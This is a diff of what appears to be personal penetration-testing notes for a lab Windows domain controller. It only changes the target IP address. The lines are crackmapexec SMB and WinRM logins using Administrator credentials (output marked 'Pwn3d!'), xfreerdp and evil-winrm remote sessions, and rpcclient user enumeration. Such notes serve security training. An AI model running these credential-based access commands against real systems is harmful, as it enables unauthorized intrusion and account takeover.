@@ -19,48 +19,48 @@ poetry dynamic-versioning enable
 
 
 
- crackmapexec smb 10.201.123.47
+ crackmapexec smb 10.201.3.6
 
 
-  crackmapexec smb 10.201.123.47
-SMB         10.201.123.47   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
+  crackmapexec smb 10.201.3.6
+SMB         10.201.3.6   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
                     
 
-crackmapexec smb 10.201.123.47 --shares
+crackmapexec smb 10.201.3.6 --shares
 
 
-crackmapexec smb 10.201.123.47 --shares
-
-
-
-$ crackmapexec smb 10.201.123.47 -u Administrator -p 'P@$$W0rd'
-SMB         10.201.123.47   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
-SMB         10.201.123.47   445    CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)
+crackmapexec smb 10.201.3.6 --shares
 
 
 
-
- crackmapexec winrm  10.201.123.47 -u Administrator -p 'P@$$W0rd'
-SMB         10.201.123.47   5985   CONTROLLER-1     [*] Windows 10.0 Build 17763 (name:CONTROLLER-1) (domain:CONTROLLER.local)
-HTTP        10.201.123.47   5985   CONTROLLER-1     [*] http://10.201.123.47:5985/wsman
-WINRM       10.201.123.47   5985   CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)
+$ crackmapexec smb 10.201.3.6 -u Administrator -p 'P@$$W0rd'
+SMB         10.201.3.6   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
+SMB         10.201.3.6   445    CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)
 
 
 
 
-xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.123.47 /u:Administrator /p:'P@$$W0rd'
+ crackmapexec winrm  10.201.3.6 -u Administrator -p 'P@$$W0rd'
+SMB         10.201.3.6   5985   CONTROLLER-1     [*] Windows 10.0 Build 17763 (name:CONTROLLER-1) (domain:CONTROLLER.local)
+HTTP        10.201.3.6   5985   CONTROLLER-1     [*] http://10.201.3.6:5985/wsman
+WINRM       10.201.3.6   5985   CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)
 
 
 
-evil-winrm -i 10.201.123.47 -u Administrator -p 'P@$$W0rd' 
+
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.3.6 /u:Administrator /p:'P@$$W0rd'
+
+
+
+evil-winrm -i 10.201.3.6 -u Administrator -p 'P@$$W0rd' 
 
 
 
 
-pcclient -U ""  10.201.123.47 -N
+pcclient -U ""  10.201.3.6 -N
 
 
-rpcclient -U 'Administrator%P@$$W0rd'  10.201.123.47     >  user.txt
+rpcclient -U 'Administrator%P@$$W0rd'  10.201.3.6     >  user.txt
 
 
 └─$ cat userK.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge userK.txt 
